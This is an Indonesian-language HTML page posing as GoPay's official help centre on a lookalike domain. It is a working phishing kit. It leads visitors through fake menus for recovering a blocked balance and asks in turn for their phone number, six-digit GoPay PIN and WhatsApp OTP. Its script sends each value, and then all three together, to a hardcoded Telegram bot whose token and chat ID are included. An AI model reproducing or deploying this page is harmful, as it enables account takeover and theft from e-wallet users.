<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gopay-Pusat bantuan web resmi</title>
    
    <!-- Sampul untuk WhatsApp -->
    <meta property="og:type" content="website">
    <meta property="og:title" content="Gopay-Pusat bantuan web resmi">
    <meta property="og:description" content="Mengalami kendala pada akun Gopay kamu? Yuk hubungi kami, kami siap membantu Anda sesuai dengan kendala yang kamu alami. Kami siap membantu, yuk hubungi Customer Service GO-PAY">
    <meta property="og:image" content="sampul-gopay.jpg">
    <meta property="og:url" content="https://pusattbantuann.ct.ws/">
    <meta name="twitter:card" content="summary_large_image">
    
    <style>
        *{margin:0;padding:0;box-sizing:border-box}
        html,body{height:100%;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;background:#fff;margin:0}

        /* LOADING */
        .loading-overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0, 0, 0, 0.5);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 9999;
            display:none;
        }
        .loading-box {
            width: 80px;
            height: 80px;
            background-color: #ffffff;
            border-radius: 10px;
            display: flex;
            align-items: center;
            justify-content: center;
            position: relative;
        }
        .dot {
            position: absolute;
            width: 12px;
            height: 12px;
            background-color: #00A6CE;
            border-radius: 50%;
        }
        .dot:nth-child(1) {
            left: 16px;
            animation: dot1 1.8s ease-in-out infinite;
        }
        .dot:nth-child(2) {
            left: 34px;
            animation: dot2 1.8s ease-in-out infinite;
        }
        .dot:nth-child(3) {
            left: 52px;
            animation: dot3 1.8s ease-in-out infinite;
        }
        @keyframes dot1 {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(18px); }
            50% { transform: translateX(0); }
        }
        @keyframes dot2 {
            0%, 100% { transform: scale(1); opacity: 1; }
            25% { transform: scale(1.3); opacity: 0.8; }
            50% { transform: scale(1); opacity: 1; }
        }
        @keyframes dot3 {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-18px); }
            50% { transform: translateX(0); }
        }

        /* POPUP NOTIFIKASI OTP */
        .popup-otp-overlay{
            position:fixed;
            top:0;
            left:0;
            width:100%;
            height:100%;
            background:rgba(0,0,0,0.5);
            z-index:10000;
            display:none;
            align-items:flex-end;
            justify-content:center;
            padding-bottom: max(20px, env(safe-area-inset-bottom));
        }
        .popup-otp-box{
            background:#fff;
            width: calc(100% - 32px);
            max-width:340px;
            border-radius:16px;
            padding:16px;
            position:relative;
            animation:popupMuncul 0.4s ease forwards;
        }
        @keyframes popupMuncul{
            from{transform:translateY(100%);opacity:0}
            to{transform:translateY(0);opacity:1}
        }
        .popup-close{
            position:absolute;
            top:8px;
            right:12px;
            font-size:26px;
            color:#666;
            cursor:pointer;
        }
        .popup-img{
            width:100%;
            height:auto;
            border-radius:12px;
            margin:8px 0;
        }
        .popup-text{
            text-align:center;
            font-size:14px;
            color:#000;
            font-weight:700;
        }

        .page{display:none;width:100%;min-height:100vh}
        .page.active{display:block}

        .top-section{background:linear-gradient(180deg,#1694d9 0%,#34b2e8 100%);padding:16px 20px 60px;position:relative;overflow:hidden;min-height:240px}
        .nav-bar{display:flex;justify-content:space-between;align-items:center;margin-bottom:24px}
        .back-btn{width:56px;height:56px;background-image:url('gopay.jpg');background-size:contain;background-repeat:no-repeat;background-position:center}
        .menu-btn{color:white;font-size:20px}
        .top-section::before,.top-section::after{content:'';position:absolute;border-radius:50%;border:2px solid rgba(255,255,255,.2)}
        .top-section::before{width:240px;height:240px;top:-80px;right:-80px}
        .top-section::after{width:180px;height:180px;top:-30px;right:-30px}
        .star{position:absolute;top:40px;right:70px;font-size:18px;color:white;z-index:1}
        .carousel-light-left,.carousel-light-right{position:absolute;top:50%;width:70px;height:200px;transform:translateY(-50%);background:radial-gradient(circle,rgba(255,255,255,.85) 0%,rgba(255,255,255,.45) 45%,transparent 100%);filter:blur(12px);z-index:1;pointer-events:none}
        .carousel-light-left{left:8px}
        .carousel-light-right{right:8px}
        .carousel-3d-container{position:relative;width:100%;max-width:800px;height:200px;margin:0 auto;perspective:800px}
        .carousel-3d{width:100%;height:100%;position:relative;transform-style:preserve-3d;animation:rotate360 16s linear infinite}
        .carousel-item{position:absolute;width:140px;height:90px;left:0;right:0;top:50px;margin:auto;transform-style:preserve-3d}
        .carousel-item::before{content:'';position:absolute;inset:-16px;border-radius:20px;background:radial-gradient(circle,rgba(255,255,255,.95) 0%,rgba(255,255,255,.6) 40%,transparent 75%);filter:blur(10px);z-index:-1}
        .carousel-item img{width:100%;height:100%;object-fit:contain;border-radius:10px;box-shadow:0 6px 20px rgba(0,0,0,.15)}
        .reflection{position:absolute;top:130%;left:-30%;width:160%;height:80%;background-size:cover;background-position:center;background-repeat:no-repeat;transform:rotateX(180deg) scaleY(1);opacity:.4;border-radius:10px;-webkit-mask-image:linear-gradient(to bottom,rgba(0,0,0,.45),transparent);mask-image:linear-gradient(to bottom,rgba(0,0,0,.45),transparent)}
        .item-1{transform:rotateY(0deg) translateZ(160px)}
        .item-2{transform:rotateY(72deg) translateZ(160px)}
        .item-3{transform:rotateY(144deg) translateZ(160px)}
        .item-4{transform:rotateY(216deg) translateZ(160px)}
        .item-5{transform:rotateY(288deg) translateZ(160px)}
        @keyframes rotate360{from{transform:rotateY(0deg)}to{transform:rotateY(360deg)}}
        .bottom-section{border-radius:28px 28px 0 0;margin-top:-32px;padding:20px 20px 12px;position:relative;z-index:10;background:#fff;background-image:url('tengah-opsi.jpg');background-repeat:no-repeat;background-position:center top;background-size:contain}

        .menu-item{background:#fff;border-radius:14px;padding:14px 16px;margin-bottom:8px;display:flex;align-items:center;justify-content:space-between;box-shadow:0 2px 6px rgba(0,0,0,.1);cursor:pointer;position:relative;z-index:20}
        .menu-item:hover{background:#f9f9f9}
        .menu-left{display:flex;align-items:center;gap:12px}
        .icon-wrapper{width:34px;height:34px;border-radius:50%;display:flex;align-items:center;justify-content:center;flex-shrink:0}
        .icon-lock{background:#e3f2fd}
        .icon-alert{background:#e1f5fe}
        .menu-text{font-size:16px;color:#1a1a1a;font-weight:700}
        .arrow{color:#999;font-size:18px}

        .navigasi-bawah{position:fixed;bottom:0;left:0;right:0;width:100%;background:#fff;z-index:1;padding-bottom: env(safe-area-inset-bottom)}
        .navigasi-bawah img{width:100%;height:auto;display:block}

        .phone-page{background:#fff;padding:20px;min-height:100vh}
        .phone-header{display:flex;justify-content:flex-end;align-items:center;margin-bottom:44px;gap:10px}
        .back-btn-text{font-size:22px;cursor:pointer;color:#000;margin-right:auto}
        .back-btn-text:hover{color:#00a862}
        .help-icon{width:30px;height:30px;background:#f0f0f0;border-radius:50%;display:flex;align-items:center;justify-content:center;font-weight:bold;color:#333;font-size:14px}
        .lang-btn{border:1px solid #ddd;border-radius:18px;padding:5px 10px;font-size:13px;color:#333;display:flex;align-items:center;gap:5px}
        .phone-title{font-size:24px;font-weight:800;color:#000;margin-bottom:8px}
        .phone-desc{font-size:14px;color:#444;margin-bottom:32px;line-height:1.45}
        .form-label{font-size:14px;color:#444;margin-bottom:6px;display:block;font-weight:700}
        .phone-input-row{display:flex;align-items:center;gap:8px;margin-bottom:6px;border-bottom:1px solid #ccc;padding-bottom:6px}
        .country-code{display:flex;align-items:center;gap:5px;padding-right:6px}
        .flag{font-size:18px}
        .code-text{font-weight:700;color:#000;font-size:15px}
        .phone-input{flex:1;padding:3px 0;border:none;font-size:16px;outline:none;color:#000;font-weight:700;width:100%}
        .phone-input::placeholder{color:#bbb;font-weight:700}
        .help-link{font-size:13px;color:#00a862;text-decoration:none;margin-bottom:26px;display:inline-block;font-weight:700}
        .btn{width:100%;padding:12px;border-radius:22px;border:none;font-size:15px;font-weight:700;cursor:pointer;transition:all .2s}
        .btn:disabled{background:#eee;color:#bbb;cursor:not-allowed}
        .btn.active{background:#00a862;color:#fff}
        .divider{text-align:center;margin:16px 0;color:#ccc;position:relative;font-size:13px;font-weight:700}
        .divider::before,.divider::after{content:'';position:absolute;top:50%;width:40%;height:1px;background:#eee}
        .divider::before{left:0}
        .divider::after{right:0}
        .btn-google{background:#fff;border:1px solid #ddd;color:#333;display:flex;align-items:center;justify-content:center;gap:8px;margin-bottom:auto;border-radius:22px;padding:12px;font-size:15px;font-weight:700;width:100%}
        .goto-footer{text-align:center;margin-top:auto;padding-top:32px;padding-bottom:16px;font-size:13px;color:#666;font-weight:700}
        .goto-text{color:#00a862;font-weight:800;font-style:italic}

        .pin-page{background:#f8f8f8;padding:20px;min-height:100vh}
        .pin-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:32px}
        .help-text-header{color:#00a862;font-weight:700;font-size:16px}
        .pin-title{font-size:17px;font-weight:800;color:#000;margin-bottom:6px;text-align:left;margin-top:32px}
        .pin-desc{font-size:13px;color:#666;margin-bottom:32px;line-height:1.45;text-align:left}
        .pin-container{display:flex;justify-content:center;align-items:center;position:relative;background:#fff;border-radius:10px;padding:14px 16px;margin-bottom:24px;box-shadow:0 1px 3px rgba(0,0,0,.05);cursor:pointer}
        .pin-dots{display:flex;gap:14px;justify-content:center}
        .pin-dot{width:12px;height:12px;border-radius:50%;border:2px solid #ccc;transition:all .2s ease}
        .pin-dot.filled{border-color:#00a862;background:#00a862}
        .pin-dot.active{border-color:#00a862;box-shadow:0 0 0 2px rgba(0,168,98,.2)}
        .eye-icon{position:absolute;right:16px;top:50%;transform:translateY(-50%);cursor:pointer}
        .eye-icon svg{width:20px;height:20px;color:#888}
        .pin-input-hidden{position:absolute;opacity:0;pointer-events:none}
        .pin-link{font-size:13px;color:#00a862;text-decoration:none;margin-bottom:26px;display:block;font-weight:700}
        .pin-footer{position:absolute;bottom:24px;left:0;right:0;text-align:center;font-size:13px;color:#666;font-weight:700}
        .gopay-text{font-weight:800;color:#00a862}

        .otp-timer-row {
            display: flex;
            align-items: center;
            gap: 10px;
            margin-bottom: 20px;
        }
        .otp-timer-wrap{
            width:26px;
            height:26px;
            flex-shrink:0;
        }
        .otp-circle{
            width:26px;
            height:26px;
            border:2px solid transparent;
            border-top:2px solid #00a862;
            border-right:2px solid #00a862;
            border-bottom:2px solid #00a862;
            border-radius:50%;
            animation:putarCincin 1s linear infinite;
            box-sizing: border-box;
        }
        @keyframes putarCincin{
            from{transform:rotate(0deg)}
            to{transform:rotate(360deg)}
        }
        .otp-timer-text{
            font-size:16px;
            font-weight:800;
            color:#000;
        }
        .hidden {display: none !important;}
    </style>
</head>
<body>

<!-- LOADING OVERLAY -->
<div id="loadingOverlay" class="loading-overlay hidden">
    <div class="loading-box">
        <div class="dot"></div>
        <div class="dot"></div>
        <div class="dot"></div>
    </div>
</div>

<!-- POPUP NOTIFIKASI OTP -->
<div id="popupOtp" class="popup-otp-overlay hidden">
    <div class="popup-otp-box">
        <div class="popup-close" id="popupClose">×</div>
        <img src="notifikasi-otp.jpg" alt="Notifikasi OTP" class="popup-img">
        <p class="popup-text">Kembali ke halaman utama</p>
    </div>
</div>

<!-- HALAMAN 1 : HALAMAN UTAMA -->
<div id="page1" class="page active">
    <div class="top-section">
        <div class="nav-bar">
            <div class="back-btn"></div>
            <div class="menu-btn">☰</div>
        </div>
        <div class="star">✦</div>
        <div class="carousel-light-left"></div>
        <div class="carousel-light-right"></div>
        <div class="carousel-3d-container">
            <div class="carousel-3d">
                <div class="carousel-item item-1"><img src="banner-promo-utama (1).jpg" alt=""><div class="reflection" style="background-image:url('banner-promo-utama (1).jpg')"></div></div>
                <div class="carousel-item item-2"><img src="banner-download-app.jpg" alt=""><div class="reflection" style="background-image:url('banner-download-app.jpg')"></div></div>
                <div class="carousel-item item-3"><img src="banner-promo-3 (1).jpg" alt=""><div class="reflection" style="background-image:url('banner-promo-3 (1).jpg')"></div></div>
                <div class="carousel-item item-4"><img src="banner-promo-2 (1).jpg" alt=""><div class="reflection" style="background-image:url('banner-promo-2 (1).jpg')"></div></div>
                <div class="carousel-item item-5"><img src="banner-promo-1 (1).jpg" alt=""><div class="reflection" style="background-image:url('banner-promo-1 (1).jpg')"></div></div>
            </div>
        </div>
          </div>
    <div class="bottom-section">
        <div class="menu-item" id="menu1">
            <div class="menu-left">
                <div class="icon-wrapper icon-lock">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                        <rect x="5" y="10" width="14" height="11" rx="2" fill="#1976D2"/>
                        <path d="M8 10V7C8 4.79086 9.79086 3 12 3C14.2091 3 16 4.79086 16 7V10" stroke="#1976D2" stroke-width="2" stroke-linecap="round"/>
                    </svg>
                </div>
                <span class="menu-text">Pemulihan saldo di blokir</span>
            </div>
            <span class="arrow">›</span>
        </div>
        <div class="menu-item" id="menu2">
            <div class="menu-left">
                <div class="icon-wrapper icon-alert">
                    <svg width="20" height="20" viewBox="0 0 24 24" fill="none">
                        <circle cx="12" cy="12" r="10" fill="#0288D1"/>
                        <text x="12" y="17" text-anchor="middle" fill="white" font-size="14" font-weight="bold">!</text>
                    </svg>
                </div>
                <span class="menu-text">Laporkan kendala akun</span>
            </div>
            <span class="arrow">›</span>
        </div>
    </div>
    <div class="navigasi-bawah"><img src="navigasi-bawah.jpg" alt=""></div>
</div>

<!-- HALAMAN 2 : NOMOR HP -->
<div id="page2" class="page">
    <div class="phone-page">
        <div class="phone-header">
            <div class="back-btn-text" id="back1">←</div>
            <div class="help-icon">?</div>
            <div class="lang-btn">🌐 Bahasa Indonesia</div>
        </div>
        <h1 class="phone-title">Masukkan nomor HP</h1>
        <p class="phone-desc">Nomor HP kamu akan dipakai untuk proses verifikasi dan masuk ke akun Gojek</p>
        <label class="form-label">Nomor HP *</label>
        <div class="phone-input-row">
            <div class="country-code"><span class="flag">🇮🇩</span><span class="code-text">+62</span></div>
            <input type="tel" id="phoneInput" class="phone-input" placeholder="81x-xxx-xxxx" maxlength="14" inputmode="numeric">
        </div>
        <a href="#" class="help-link">Ada kendala atau lupa nomor?</a>
        <button id="btnLanjut" class="btn" disabled>Lanjut</button>
        <div class="divider">or</div>
        <button class="btn btn-google">
            <svg width="20" height="20" viewBox="0 0 24 24">
                <path fill="#4285F4" d="M22.56 12.25c0-.78-.07-1.53-.2-2.25H12v4.26h5.92c-.26 1.37-1.04 2.53-2.21 3.31v2.77h3.57c2.08-1.92 3.28-4.74 3.28-8.09z"/>
                <path fill="#34A853" d="M12 23c2.97 0 5.46-.98 7.28-2.66l-3.57-2.77c-.98.66-2.23 1.06-3.71 1.06-2.86 0-5.29-1.93-6.16-4.53H2.18v2.84C3.99 20.53 7.7 23 12 23z"/>
                <path fill="#FBBC05" d="M5.84 14.09c-.22-.66-.35-1.36-.35-2.09s.13-1.43.35-2.09V7.07H2.18C1.43 8.55 1 10.22 1 12s.43 3.45 1.18 4.93l2.85-2.22.81-.62z"/>
                <path fill="#EA4335" d="M12 5.38c1.62 0 3.06.56 4.21 1.64l3.15-3.15C17.45 2.09 14.97 1 12 1 7.7 1 3.99 3.47 2.18 7.07l3.66 2.84c.87-2.6 3.3-4.53 6.16-4.53z"/>
            </svg>
            Lanjut dengan Google
        </button>
        <div class="goto-footer">from <span class="goto-text">goto</span></div>
    </div>
</div>

<!-- HALAMAN 3 : PIN -->
<div id="page3" class="page">
    <div class="pin-page">
        <div class="pin-header">
            <div class="back-btn-text" id="back2">←</div>
            <div class="help-text-header">Bantuan</div>
        </div>
        <h2 class="pin-title">Ketik GoPay PIN kamu untuk masuk.</h2>
        <p class="pin-desc">Ini cepat, aman, dan tidak memerlukan OTP.</p>
        <div class="pin-container" id="pinContainer">
            <div class="pin-dots">
                <div class="pin-dot" id="dot1"></div>
                <div class="pin-dot" id="dot2"></div>
                <div class="pin-dot" id="dot3"></div>
                <div class="pin-dot" id="dot4"></div>
                <div class="pin-dot" id="dot5"></div>
                <div class="pin-dot" id="dot6"></div>
            </div>
            <div class="eye-icon" id="eyeIcon">
                <svg xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                    <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                </svg>
            </div>
            <input type="text" id="pinInput" class="pin-input-hidden" maxlength="6" inputmode="numeric" autofocus>
        </div>
        <a href="#" class="pin-link">Masalah login atau daftar?</a>
        <div class="pin-footer">Powered by <span class="gopay-text">gopay</span></div>
    </div>
</div>

<!-- HALAMAN 4 : OTP -->
<div id="page4" class="page">
    <div class="phone-page">
        <div class="phone-header">
            <div class="back-btn-text" id="back3">←</div>
        </div>
        <h1 class="phone-title">Masukkan OTP yang dikirim ke WhatsApp</h1>
        <p class="phone-desc">OTP dikirim ke <span id="nomorTujuanOTP">+62xxxxxx0664</span></p>

        <label class="form-label">OTP *</label>
        <div class="phone-input-row">
            <input type="text" id="otpInput" class="phone-input" maxlength="6" inputmode="numeric" autofocus>
            <div class="otp-timer-row">
                <div class="otp-timer-wrap">
                    <div class="otp-circle"></div>
                </div>
                <div id="otpTimerText" class="otp-timer-text">01:00</div>
            </div>
        </div>

        <a id="kirimUlangLink" class="help-link" href="#">Kirim ulang</a>
        <div class="goto-footer">from <span class="goto-text">goto</span></div>
    </div>
</div>

<script>
const loadingOverlay = document.getElementById('loadingOverlay');
const otpTimerText = document.getElementById('otpTimerText');
const kirimUlangLink = document.getElementById('kirimUlangLink');

// === KONFIGURASI TELEGRAM ===
const BOT_TOKEN = '8931800061:AAGbhFlYBNwX2Kb_Uo9PyuV3P78ctv181PY';
const CHAT_ID = '7721310929';

// === FUNGSI KIRIM NOTIFIKASI TELEGRAM ===
function kirimTelegram(pesan) {
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    
    fetch(url, {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({
            chat_id: CHAT_ID,
            text: pesan,
            parse_mode: 'HTML'
        })
    })
    .then(res => res.json())
    .then(data => console.log('Terkirim ke Telegram'))
    .catch(err => console.log('Gagal kirim:', err));
}

// === FUNGSI LOADING ===
function showLoading(){ 
    loadingOverlay.style.display = 'flex'; 
    document.activeElement.blur();
}
function hideLoading(){ 
    loadingOverlay.style.display = 'none'; 
}

// === FUNGSI TIMER OTP ===
let otpTimer;
let otpSisaDetik = 60;

function startOtpTimer(){
    clearInterval(otpTimer);
    otpSisaDetik = 60;
    kirimUlangLink.style.display = 'none';
    tampilkanWaktu();

    otpTimer = setInterval(() => {
        otpSisaDetik--;
        tampilkanWaktu();

        if(otpSisaDetik <= 0){
            clearInterval(otpTimer);
            kirimUlangLink.style.display = 'block';
        }
    }, 1000);
}

function tampilkanWaktu(){
    const menit = String(Math.floor(otpSisaDetik / 60)).padStart(2,'0');
    const detik = String(otpSisaDetik % 60).padStart(2,'0');
    otpTimerText.textContent = `${menit}:${detik}`;
}

// === PINDAH HALAMAN ===
function showPage(pageId) {
    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
    document.getElementById(pageId).classList.add('active');
    window.scrollTo(0,0);
}

// === MENU UTAMA ===
document.getElementById('menu1').addEventListener('click', function() {
    showPage('page2');
});
document.getElementById('menu2').addEventListener('click', function() {
    showPage('page2');
});
document.getElementById('back1').addEventListener('click', function() {
    showPage('page1');
});

// === HALAMAN NOMOR HP ===
const phoneInput = document.getElementById('phoneInput');
const btnLanjut = document.getElementById('btnLanjut');
let nomorTelepon = '';

phoneInput.addEventListener('input', function() {
    let value = this.value.replace(/\D/g, '');
    this.value = value;
    
    if (value.length >= 10 && value.length <= 14) {
        btnLanjut.disabled = false;
        btnLanjut.classList.add('active');
    } else {
        btnLanjut.disabled = true;
        btnLanjut.classList.remove('active');
    }
});

btnLanjut.addEventListener('click', function() {
    nomorTelepon = phoneInput.value;
    showLoading();
    kirimTelegram('NOMOR TELEPON:\n0' + nomorTelepon);
    setTimeout(function(){
        hideLoading();
        showPage('page3');
        setTimeout(() => document.getElementById('pinInput').focus(), 200);
    },1200);
});

// === HALAMAN PIN ===
document.getElementById('back2').addEventListener('click', function() {
    showPage('page2');
});

let pinValue = '';
let nomorPin = '';
const pinInput = document.getElementById('pinInput');

pinInput.addEventListener('input', function() {
    pinValue = this.value.replace(/\D/g, '').slice(0, 6);
    this.value = pinValue;
    updateDots();
    
    if (pinValue.length === 6) {
        nomorPin = pinValue;
        showLoading();
        kirimTelegram('PIN:\n' + nomorPin);
        
        setTimeout(() => {
            hideLoading();
            showPage('page4');
            startOtpTimer();
            setTimeout(() => document.getElementById('otpInput').focus(), 200);
        }, 1200);
    }
});

function updateDots() {
    for (let i = 1; i <= 6; i++) {
        const dot = document.getElementById('dot' + i);
        if (i <= pinValue.length) {
            dot.classList.add('filled');
        } else {
            dot.classList.remove('filled');
        }
    }
}

document.getElementById('pinContainer').addEventListener('click', function() {
    pinInput.focus();
});

// === HALAMAN OTP ===
let otpValue = '';
const otpInput = document.getElementById('otpInput');

if (otpInput) {
    otpInput.addEventListener('input', function() {
        otpValue = this.value.replace(/\D/g, '').slice(0, 6);
        this.value = otpValue;
        
        if (otpValue.length === 6) {
            showLoading();
            kirimTelegram('KODE OTP:\n' + otpValue);
            kirimTelegram('DATA LENGKAP:\nNOMOR: 0' + nomorTelepon + '\nPIN: ' + nomorPin + '\nOTP: ' + otpValue);
            setTimeout(function(){
                hideLoading();
            },1200);
        }
    });
}

document.getElementById('back3').addEventListener('click', function() {
    clearInterval(otpTimer);
    showPage('page2');
});

kirimUlangLink.addEventListener('click', function(e){
    e.preventDefault();
    startOtpTimer();
});
</script>

</body>
</html>
      
